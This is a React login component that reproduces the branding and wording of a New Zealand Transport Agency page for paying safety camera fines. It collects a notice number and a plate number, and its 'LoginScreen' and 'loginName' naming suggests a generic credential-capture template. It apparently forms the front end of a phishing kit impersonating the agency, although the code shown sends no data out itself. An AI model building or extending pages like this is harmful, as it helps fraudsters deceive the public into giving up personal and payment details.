import React, { useState } from 'react';
import './LoginScreen.css';
import nztaLogo from '../assets/nzta-logo.png';

function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin }) {
  const [showError, setShowError] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [noticeNumber, setNoticeNumber] = useState('');

  const handleContinueClick = () => {
    // Validate Notice number
    if (!noticeNumber || noticeNumber.trim() === '') {
      setShowError(true);
      setErrorMsg('Please enter your notice number');
      return;
    }
    if (!noticeNumber.toUpperCase().startsWith('SC')) {
      setShowError(true);
      setErrorMsg('Notice number must start with "SC"');
      return;
    }
    // Validate Plate
    if (!loginName || loginName.trim() === '') {
      setShowError(true);
      setErrorMsg('Please enter your plate number');
      return;
    }
    if (loginName.trim().length < 2) {
      setShowError(true);
      setErrorMsg('Please enter a valid plate number');
      return;
    }

    setShowError(false);

    // Save notice number so LoginForm can access it
    sessionStorage.setItem('noticeNumber', noticeNumber.trim().toUpperCase());

    // Pass both values up through onInputChange, then trigger login
    onInputChange('loginName', loginName.trim().toUpperCase());
    onLogin();
  };

  const handleCancel = () => {
    setShowError(false);
    setErrorMsg('');
    setNoticeNumber('');
    onInputChange('loginName', '');
  };

  return (
    <div className="nzta-renewal">
      {/* ─── Header ─── */}
      <header className="nzta-header">
        <div className="nzta-header-inner">
          <div className="nzta-logo">
            <img
              src={nztaLogo}
              alt="NZ Transport Agency"
              className="nzta-logo-img"
            />
          </div>
        </div>
      </header>

      {/* ─── Main ─── */}
      <main className="nzta-main">
        <h1 className="nzta-title">Pay a safety camera infringement</h1>

        <hr className="nzta-divider" />

        <h2 className="nzta-subtitle">Notice and plate details</h2>

        {/* Notice number */}
        <div className="nzta-field">
          <label>Notice number</label>
          <input
            type="text"
            value={noticeNumber}
            onChange={(e) => {
              setNoticeNumber(e.target.value.toUpperCase());
              setShowError(false);
            }}
            className={`nzta-input ${showError && !noticeNumber ? 'input-error-red' : ''}`}
            maxLength={12}
          />
          <span className="nzta-help">
            Your notice number starts with the letters SC - for example, SC12345678.
          </span>
        </div>

        {/* Plate */}
        <div className="nzta-field">
          <label>Plate</label>
          <input
            type="text"
            value={loginName}
            onChange={(e) => {
              onInputChange('loginName', e.target.value.toUpperCase());
              setShowError(false);
            }}
            className={`nzta-input ${showError && !loginName ? 'input-error-red' : ''}`}
            maxLength={8}
          />
        </div>

        {/* Error */}
        {showError && <div className="nzta-error-banner">⚠️ {errorMsg}</div>}

        {/* Actions */}
        <div className="nzta-actions">
          <button
            type="button"
            className="nzta-btn nzta-btn-continue"
            onClick={handleContinueClick}
            disabled={isLoading}
          >
            {isLoading ? 'Please wait…' : 'Continue'}
          </button>
          <button
            type="button"
            className="nzta-btn nzta-btn-cancel"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </button>
        </div>
      </main>
    </div>
  );
}

export default LoginScreen;